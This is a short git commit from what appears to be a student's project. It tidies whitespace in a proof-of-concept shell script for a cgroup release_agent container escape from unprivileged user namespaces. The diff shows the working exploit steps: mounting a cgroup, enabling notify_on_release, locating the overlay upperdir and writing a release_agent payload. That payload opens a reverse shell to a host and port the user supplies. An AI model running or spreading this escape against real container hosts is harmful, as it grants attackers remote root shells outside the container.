75fdcec5ee1e3900831b63b72c6edcf821cef605
giorgio-hash <g.chirico1@studenti.unibg.it>
2023-08-19 12:27:21 +0200

    tolti spazi inutili

--- unpriv userns escape/PoC_generico/cgesc.sh
+++ unpriv userns escape/PoC_generico/cgesc.sh
@@ -1,12 +1,11 @@
 #!/bin/bash
 
-
+# uso: ./cgesc.sh ip_dest port_dest root_cgroup
 
 mount -t cgroup -o $3 cgroup /tmp/cgrp;
 mkdir /tmp/cgrp/x;
 echo 1 > /tmp/cgrp/x/notify_on_release;
 UPPERDIR=$(cat /etc/mtab | grep overlay | awk -F "," '{ for (i=1; i<=NF; i++) { if ($i ~ /upperdir/) { print $i } } }' | cut -d "=" -f 2);
-
 if echo "$UPPERDIR/cmd" > /tmp/cgrp/release_agent; then
     echo '#!/bin/bash' > /cmd;
     echo "/bin/bash -i >& /dev/tcp/$1/$2 0>&1 2>&1" >> /cmd;
